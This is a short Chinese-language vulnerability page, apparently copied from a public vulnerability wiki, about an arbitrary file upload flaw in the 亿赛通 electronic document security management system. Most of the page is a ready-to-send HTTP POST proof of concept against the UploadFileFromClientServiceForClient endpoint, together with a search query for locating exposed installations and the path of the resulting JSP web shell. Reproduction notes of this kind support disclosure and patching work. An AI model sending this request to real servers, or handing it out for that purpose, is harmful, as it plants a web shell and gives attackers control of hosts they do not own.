---
title: "亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞"
date: 2026-10-16 09:10:15
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "亿赛通"
tags:
  - "亿赛通"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

亿赛通 电子文档安全管理系统 UploadFileFromClientServiceForClient 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，获取主机权限。

参考链接：

- https://github.com/di0xide-U/YSTupload/blob/main/exp.md

## 漏洞影响

亿赛通 电子文档安全管理系统

## 网络测绘

```
app="亿赛通-电子文档安全管理系统"
```

## 漏洞复现

登录页面

![image-20230828111346925](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111346925.png)

验证POC

```
POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Content-Length: 1

Test
```

![image-20230828111455826](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111455826.png)

```
Shell访问地址：https://your-ip/tttT.jsp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-UploadFileFromClientServiceForClient-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
